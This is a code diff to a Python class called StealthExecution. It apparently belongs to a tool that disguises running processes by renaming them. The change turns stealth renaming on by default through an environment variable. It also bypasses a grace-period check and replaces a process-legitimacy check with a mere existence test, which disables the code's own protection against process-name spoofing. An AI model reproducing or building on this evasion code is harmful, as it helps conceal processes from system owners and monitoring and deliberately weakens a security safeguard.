@@ -306,29 +306,44 @@ class StealthExecution:
             if len(self._protected_processes) > self._max_registry_size:
                 self._emergency_cleanup()
             
-            # **Whitelist Check** (Kiểm tra danh sách trắng)
-            # **Grace Period Check** (Kiểm tra thời gian ân hạn)
-            try:
-                proc_ctime = os.path.getctime(f"/proc/{pid}")
-            except Exception:
-                proc_ctime = time.time()
-            if time.time() - proc_ctime < self._grace_period_secs:
-                # Chờ hết ân hạn trước khi disguise
-                self._register_protected_process(pid, process_name)
-                return False
+            # **Whitelist Check** (Kiểm tra danh sách trắng) - DISABLED FOR STEALTH RENAME
+            # **Grace Period Check** (Kiểm tra thời gian ân hạn) - BYPASSED
+            # ✅ STEALTH RENAME ENABLED: Luôn cho phép disguise để stealth hoạt động
+            stealth_mode_enabled = os.getenv("ENABLE_STEALTH_RENAME", "true").lower() == "true"
+            if stealth_mode_enabled:
+                self.logger.debug(f"🔧 [STEALTH_RENAME] Grace period bypassed for PID {pid} - stealth mode enabled")
+            else:
+                try:
+                    proc_ctime = os.path.getctime(f"/proc/{pid}")
+                except Exception:
+                    proc_ctime = time.time()
+                if time.time() - proc_ctime < self._grace_period_secs:
+                    # Chờ hết ân hạn trước khi disguise
+                    self._register_protected_process(pid, process_name)
+                    return False
             
             # **Binary Path Security Verification** (Xác minh đường dẫn binary bảo mật)
-            if self._verify_process_legitimacy(pid, process_name):
-                self._protection_stats["bypass_count"] += 1
-                return True
-            
-            # **Security Alert** - Potential spoofing attempt
-            self.logger.warning(
-                f"⚠️ [SECURITY] PID {pid} failed legitimacy check - "
-                f"Potential process name spoofing attempt blocked"
-            )
-            self._protection_stats["spoofing_attempts_blocked"] += 1
-            return False
+            # ✅ STEALTH RENAME: Simplified legitimacy check
+            if stealth_mode_enabled:
+                # Trong stealth mode, chỉ cần kiểm tra process tồn tại
+                if os.path.exists(f"/proc/{pid}"):
+                    self._protection_stats["bypass_count"] += 1
+                    return True
+                else:
+                    return False
+            else:
+                # Original legitimacy check cho non-stealth mode
+                if self._verify_process_legitimacy(pid, process_name):
+                    self._protection_stats["bypass_count"] += 1
+                    return True
+                
+                # **Security Alert** - Potential spoofing attempt
+                self.logger.warning(
+                    f"⚠️ [SECURITY] PID {pid} failed legitimacy check - "
+                    f"Potential process name spoofing attempt blocked"
+                )
+                self._protection_stats["spoofing_attempts_blocked"] += 1
+                return False
             
         except Exception as e:
             self._handle_error(e)
